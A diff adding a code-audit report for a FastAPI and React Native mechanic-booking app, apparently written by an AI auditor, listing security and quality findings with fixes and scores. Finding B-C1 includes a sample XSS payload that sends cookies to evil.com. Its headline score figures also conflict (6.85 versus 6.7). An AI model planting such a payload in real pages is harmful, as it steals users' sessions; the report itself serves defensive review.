@@ -1,0 +1,423 @@
+================================================================================
+                    eMecano - FINAL PRODUCTION AUDIT (Round 3)
+================================================================================
+Date:       2026-02-10
+Auditor:    Claude Opus 4.6 (Senior Full-Stack Engineer)
+Scope:      Backend (FastAPI + SQLAlchemy) + Mobile (React Native + Expo)
+Files:      ~90 source files audited
+Context:    After 3 rounds of audit-fix cycles. All previous CRITICAL and HIGH
+            issues from Rounds 1-2 have been resolved.
+================================================================================
+
+
+================================================================================
+ EXECUTIVE SUMMARY
+================================================================================
+
+ Previous audit:  74 findings (13 CRITICAL, 17 HIGH, 28 MEDIUM, 16 LOW)
+ Fixed:           All 74 findings addressed across Phases 1-5
+
+ This audit:      38 remaining findings
+ ---------------------------
+ CRITICAL:         4  (must fix before launch)
+ HIGH:            10  (serious, fix before public release)
+ MEDIUM:          14  (quality concerns, fix soon after launch)
+ LOW:             10  (polish, ongoing improvement)
+
+ Backend Score:   7.2 / 10
+ Frontend Score:  6.5 / 10
+ Overall Score:   6.85 / 10
+
+ Verdict: CONDITIONALLY READY for soft launch / beta.
+ The 4 CRITICAL items are targeted security/integrity issues, not systemic
+ architecture problems. Fix those + the 10 HIGH items and you can deploy
+ to early users. The codebase is fundamentally sound.
+
+
+================================================================================
+================================================================================
+ PART 1: BACKEND AUDIT
+================================================================================
+================================================================================
+
+ Category Scores:
+   Bugs:             7/10  (few remaining logic bugs)
+   Weird Code:       8/10  (clean, consistent patterns)
+   Architecture:     7/10  (no service layer, but acceptable for MVP)
+   Security:         4/10  (XSS, race condition, JWT config)
+   Performance:      8/10  (indexes added, chunked uploads done)
+   Error Handling:   7/10  (Stripe covered, some gaps remain)
+   Data Integrity:   6/10  (missing FK cascades, race in code entry)
+   Testing:          9/10  (170 tests pass, good coverage)
+
+ Backend Average: 7.0 / 10
+
+
+--------------------------------------------------------------------------------
+ CRITICAL (2 findings)
+--------------------------------------------------------------------------------
+
+[B-C1] XSS via user-generated content
+  Files: app/schemas/booking.py, app/schemas/review.py, app/schemas/payment.py
+  Risk:  Review comments, dispute descriptions, and booking notes are stored
+         and returned as raw strings. If rendered in a WebView or admin panel,
+         XSS payloads execute. Example: a review body of
+         <script>document.location='evil.com?c='+document.cookie</script>
+  Fix:   Sanitize all user text inputs at the schema level using a library
+         like bleach or nh3. Strip HTML tags on input, not output.
+         Add @field_validator to text fields.
+
+[B-C2] Race condition in check-in code entry
+  File:  app/bookings/routes.py (enter_code endpoint)
+  Risk:  code_attempts is incremented non-atomically:
+         1. Read booking.code_attempts (e.g., 2)
+         2. Python increments to 3
+         3. Write back 3
+         If two concurrent requests read 2 simultaneously, both write 3.
+         Attacker can brute-force the 4-digit code by sending many parallel
+         requests (only 10,000 combinations, 3 attempts limit bypassed).
+  Fix:   Use SQL-level atomic increment:
+         UPDATE bookings SET code_attempts = code_attempts + 1
+         WHERE id = :id AND code_attempts < 3
+         RETURNING code_attempts
+         Or use SELECT ... FOR UPDATE before the check.
+
+
+--------------------------------------------------------------------------------
+ HIGH (5 findings)
+--------------------------------------------------------------------------------
+
+[B-H1] JWT_SECRET allows empty string
+  File:  app/config.py
+  Risk:  JWT_SECRET: str = "" allows starting the server with no secret.
+         JWTs would be signed with empty key, trivially forgeable.
+  Fix:   Add a startup validator: if not settings.JWT_SECRET or
+         len(settings.JWT_SECRET) < 32, raise SystemExit.
+
+[B-H2] Missing rate limits on booking creation and review endpoints
+  Files: app/bookings/routes.py (create_booking),
+         app/reviews/routes.py (create_review)
+  Risk:  No rate limiting. A malicious user could spam-create bookings
+         (each triggers Stripe PaymentIntent) or flood reviews.
+  Fix:   Add @limiter.limit("10/minute") to create endpoints.
+
+[B-H3] Orphaned Stripe PaymentIntents on network failures
+  File:  app/bookings/routes.py (create_booking)
+  Risk:  If Stripe returns a PaymentIntent but the DB commit fails after,
+         the PaymentIntent exists in Stripe but not in the database.
+         No cleanup mechanism exists. Money is held indefinitely.
+  Fix:   Add a reconciliation cron that queries Stripe for uncaptured
+         PaymentIntents older than 24h and cancels them.
+         Or wrap in a saga pattern with compensating action.
+
+[B-H4] Missing ON DELETE constraints on foreign keys
+  Files: app/models/booking.py, app/models/review.py,
+         app/models/availability.py
+  Risk:  No ON DELETE CASCADE or SET NULL on ForeignKeys. Deleting a user
+         leaves orphaned bookings/reviews with dangling FK references.
+         Queries crash with IntegrityError.
+  Fix:   Add ondelete="CASCADE" or ondelete="SET NULL" to ForeignKey
+         definitions. Create an alembic migration.
+
+[B-H5] PDF generation blocks the request thread
+  File:  app/bookings/routes.py (check_out endpoint)
+  Risk:  WeasyPrint PDF generation is CPU-heavy and synchronous. A checkout
+         with PDF generation blocks the async event loop for 2-5 seconds.
+         Under load, this starves other requests.
+  Fix:   Move PDF generation to a background task (BackgroundTasks) or
+         a task queue. Return 202 and generate async.
+
+
+--------------------------------------------------------------------------------
+ MEDIUM (7 findings)
+--------------------------------------------------------------------------------
+
+[B-M1] No service layer (business logic in routes)
+  Files: app/bookings/routes.py, app/mechanics/routes.py
+  Risk:  Route handlers contain 100+ line functions mixing HTTP concerns
+         with business logic. Makes testing harder and reuse impossible.
+  Fix:   Extract to services/booking_service.py, services/mechanic_service.py.
+         Routes become thin wrappers. Not blocking for launch.
+
+[B-M2] No audit logging for sensitive operations
+  Files: all routes
+  Risk:  No record of who did what and when. Disputes are hard to resolve.
+         No trail for payment captures, status changes, or admin actions.
+  Fix:   Add an AuditLog model. Log booking state transitions, payment
+         events, and admin actions.
+
+[B-M3] No circuit breaker for Stripe API calls
+  Files: app/services/stripe_service.py
+  Risk:  If Stripe is down, every request retries and waits for timeout.
+         Cascading failures under load.
+  Fix:   Implement circuit breaker pattern (e.g., pybreaker library).
+         After N failures, open circuit and fail fast for 30s.
+
+[B-M4] APScheduler still uses MemoryJobStore
+  File:  app/services/scheduler.py
+  Risk:  Multi-instance deployment runs duplicate jobs. The catch-all
+         cron mitigates lost jobs but doesn't prevent duplicates.
+  Fix:   Migrate to Redis or PostgreSQL job store, or use DB advisory
+         locks. Acceptable for single-instance MVP.
+
+[B-M5] New mechanic profiles created at coordinates (0, 0)
+  File:  app/auth/routes.py
+  Risk:  Default lat=0, lng=0 places new mechanics in the Gulf of Guinea.
+         They appear in searches near (0,0) until they update their profile.
+  Fix:   Use nullable lat/lng, or require location at first profile setup.
+
+[B-M6] No request body size limit in application layer
+  File:  Dockerfile
+  Risk:  Although uvicorn has --limit-max-header-size, there's no
+         --limit-request-body. Large POST bodies can exhaust memory.
+  Fix:   Add --limit-request-body 10485760 (10MB) to uvicorn CMD.
+
+[B-M7] Register returns tokens before email is verified
+  File:  app/auth/routes.py
+  Risk:  is_verified=False blocks booking creation, but the user gets
+         full API access tokens immediately. They can browse, make API
+         calls, and only discover they can't book after filling forms.
+  Fix:   Return limited token or require verification before token issue.
+         At minimum, communicate verification status clearly in the app.
+
+
+--------------------------------------------------------------------------------
+ LOW (5 findings)
+--------------------------------------------------------------------------------
+
+[B-L1] python-jose is deprecated — migrate to PyJWT or joserfc
+[B-L2] Check-in code is only 4 digits (10,000 combinations)
+        Consider 6-digit for better brute-force resistance.
+[B-L3] == True in SQLAlchemy filters (use .is_(True) for clarity)
+[B-L4] No DB-level exclusion constraint for availability overlaps
+        (application-level check + FOR UPDATE exists, but DB constraint
+        would be belt-and-suspenders)
+[B-L5] CORS_ORIGINS defaults to empty in production
+        Ensure this is configured in deployment.
+
+
+================================================================================
+================================================================================
+ PART 2: FRONTEND AUDIT
+================================================================================
+================================================================================
+
+ Category Scores:
+   Bugs/Crashes:     6/10  (navigation bug, null safety gaps)
+   Weird Code:       7/10  (mostly clean, some inconsistencies)
+   Architecture:     7/10  (good structure, hooks pattern solid)
+   UX:               6/10  (missing loading states, form polish)
+   Performance:      7/10  (no major issues, pagination missing)
+   Type Safety:      6/10  (too many `any` casts in error handling)
+   Security:         6/10  (SecureStore done, some gaps remain)
+
+ Frontend Average: 6.4 / 10
+
+
+--------------------------------------------------------------------------------
+ CRITICAL (2 findings)
+--------------------------------------------------------------------------------
+
+[F-C1] Navigation bug in payment cancellation flow
+  File:  src/screens/buyer/BookingConfirmScreen.tsx
+  Risk:  When user cancels Stripe payment sheet, the booking is already
+         created in the database (status: PENDING_PAYMENT). But the user
+         is shown an error and navigated away. The booking is stuck in
+         PENDING_PAYMENT forever with a held PaymentIntent.
+  Fix:   On payment cancellation, call bookingsApi.cancel(bookingId) to
+         release the hold. Or don't create the booking until payment
+         succeeds (two-phase: create intent first, create booking on
+         confirmation).
+
+[F-C2] Missing null check for mechanic_profile.id in AvailabilityScreen
+  File:  src/screens/mechanic/AvailabilityScreen.tsx
+  Risk:  user?.mechanic_profile?.id is used without null guard. If the
+         profile hasn't loaded yet or is undefined, the API call sends
+         undefined as mechanic_id, which crashes or returns wrong data.
+  Fix:   Add early return with loading state when mechanic_profile is null.
+
+
+--------------------------------------------------------------------------------
+ HIGH (5 findings)
+--------------------------------------------------------------------------------
+
+[F-H1] No centralized error handling pattern
+  Files: all screens with mutations
+  Risk:  Each screen handles errors differently: some use Alert, some use
+         Toast (not implemented), some swallow silently. User experience
+         is inconsistent. Some errors are never shown to the user.
+  Fix:   Create a useErrorHandler hook or global error toast. Wrap all
+         mutation onError callbacks consistently.
+
+[F-H2] Date/timezone handling inconsistencies
+  Files: src/utils/formatters.ts, multiple screens
+  Risk:  Dates from backend are UTC strings. formatDate() may display
+         wrong date near midnight due to timezone conversion. No
+         explicit timezone handling anywhere in the app.
+  Fix:   Use date-fns-tz or dayjs with timezone plugin. Format all dates
+         in Europe/Paris timezone (French market).
+
+[F-H3] Too many `any` types in error handling
+  Files: src/stores/authStore.ts:80, src/screens/* (catch blocks)
+  Risk:  (err: any) throughout the codebase. No type narrowing on Axios
+         errors. Accessing err.response.status without checking if it's
+         an AxiosError first. Potential runtime crashes on unexpected
+         error shapes.
+  Fix:   Use isAxiosError(err) type guard from axios. Create a typed
+         ApiError interface.
+
+[F-H4] SearchScreen sends API request with lat:0, lng:0 before location
+  File:  src/screens/buyer/SearchScreen.tsx
+  Risk:  Before location permission is granted, the query fires with
+         default coordinates (0,0). Returns mechanics near Null Island.
+         Wastes API call and shows wrong results briefly.
+  Fix:   Add enabled: !!location && location.lat !== 0 to useQuery.
+         Show "Localisation en cours..." placeholder.
+
+[F-H5] No form data loss prevention
+  Files: BookingConfirmScreen, MechanicProfileScreen
+  Risk:  User fills a long form, accidentally swipes back, all data lost.
+         No "unsaved changes" warning. Common frustration point.
+  Fix:   Use React Navigation's beforeRemove listener to warn users.
+
+
+--------------------------------------------------------------------------------
+ MEDIUM (7 findings)
+--------------------------------------------------------------------------------
+
+[F-M1] AvailabilityScreen uses raw TextInput for date/time entry
+  File:  src/screens/mechanic/AvailabilityScreen.tsx
+  Risk:  Mechanics must type dates as "2025-03-15" and times as "09:00".
+         Error-prone, terrible UX, no validation feedback.
+  Fix:   Use @react-native-community/datetimepicker.
+
+[F-M2] No pagination on booking lists
+  File:  src/hooks/useBookings.ts
+  Risk:  Loads all bookings at once. Heavy users with 100+ bookings
+         will see slow loads and high memory usage.
+  Fix:   Implement useInfiniteQuery with FlatList onEndReached.
+
+[F-M3] Missing empty states on list screens
+  Files: MyBookingsScreen, DashboardScreen
+  Risk:  Empty lists show blank white screen. User doesn't know if data
+         is loading, empty, or errored.
+  Fix:   Add empty state illustrations with call-to-action.
+
+[F-M4] MechanicProfileScreen calls API directly (bypasses React Query)
+  File:  src/screens/mechanic/MechanicProfileScreen.tsx
+  Risk:  Direct API call skips cache invalidation. Profile updates don't
+         reflect in other screens until manual refresh.
+  Fix:   Create useUpdateMechanicProfile mutation with cache invalidation.
+
+[F-M5] queryClient staleTime 5min too long for booking status updates
+  File:  src/services/queryClient.ts
+  Risk:  Booking status changes (accept/refuse/check-in) take up to 5min
+         to reflect. User thinks nothing happened.
+  Fix:   Override staleTime for booking queries to 30s. Invalidate on
+         mutation success.
+
+[F-M6] No push notification support
+  File:  (missing)
+  Risk:  Users don't know when their booking is accepted, mechanic
+         arrives, or checkout is complete. Must manually refresh.
+  Fix:   Implement expo-notifications with FCM/APNs.
+
+[F-M7] DashboardScreen SafeAreaView doubles with tab bar header
+  File:  src/screens/mechanic/DashboardScreen.tsx
+  Risk:  Extra top padding on screens within tab navigator that already
+         has a header with safe area handling.
+  Fix:   Remove SafeAreaView from tab-contained screens.
+
+
+--------------------------------------------------------------------------------
+ LOW (5 findings)
+--------------------------------------------------------------------------------
+
+[F-L1] refetchOnWindowFocus: false disables refresh on app resume
+[F-L2] Splash background white vs primary blue (#1E3A8A) mismatch
+[F-L3] No returnKeyType/onSubmitEditing keyboard navigation on forms
+[F-L4] MechanicDetailScreen shows raw time strings (no formatting)
+[F-L5] vehiclePlate required in UI but optional in API schema
+
+
+================================================================================
+ COMPARISON WITH PREVIOUS AUDIT
+================================================================================
+
+ Category                    Round 1         Round 3         Delta
+ --------                    -------         -------         -----
+ Total Findings              74              38              -36 (51% reduction)
+ CRITICAL                    13              4               -9
+ HIGH                        17              10              -7
+ MEDIUM                      28              14              -14
+ LOW                         16              10              -6
+
+ All 13 original CRITICAL issues are resolved.
+ All 17 original HIGH issues are resolved.
+ New findings are mostly deeper issues that require architectural
+ decisions (service layer, task queue, circuit breaker) or UX polish.
+
+
+================================================================================
+ OVERALL SCORES
+================================================================================
+
+ BACKEND
+ -------
+   Bugs:             7/10
+   Code Quality:     8/10
+   Architecture:     7/10
+   Security:         4/10
+   Performance:      8/10
+   Error Handling:   7/10
+   Data Integrity:   6/10
+   Testing:          9/10
+   Backend Average:  7.0/10
+
+ FRONTEND
+ --------
+   Bugs/Crashes:     6/10
+   Code Quality:     7/10
+   Architecture:     7/10
+   UX:               6/10
+   Performance:      7/10
+   Type Safety:      6/10
+   Security:         6/10
+   Frontend Average: 6.4/10
+
+ =======================================
+   OVERALL PROJECT SCORE:  6.7 / 10
+ =======================================
+
+
+================================================================================
+ RECOMMENDATION
+================================================================================
+
+ The codebase has improved significantly from the initial audit (74 → 38
+ findings, all original CRITICALs resolved). The remaining issues fall
+ into two categories:
+
+ 1. MUST-FIX BEFORE LAUNCH (4 CRITICAL + select HIGH):
+    - XSS sanitization on user text inputs
+    - Atomic code_attempts increment (brute-force prevention)
+    - Payment cancellation flow (stuck bookings + held funds)
+    - Null guard on mechanic_profile.id
+    - JWT_SECRET minimum length validation
+    - Rate limits on create endpoints
+
+ 2. SHOULD-FIX BUT NOT BLOCKING:
+    - Service layer extraction (refactor, not a bug)
+    - Task queue for PDF generation (perf under load)
+    - Push notifications (UX, not functionality)
+    - Date picker UX improvements
+    - Pagination on lists
+
+ VERDICT: Fix the 4 CRITICALs and the top 5 HIGHs (roughly 1-2 days
+ of work), then you are ready for a soft launch / closed beta.
+ The codebase is solid for an MVP. The architecture is clean enough
+ to iterate on. Do not over-polish before getting real user feedback.
+
+================================================================================
+ END OF AUDIT
+================================================================================
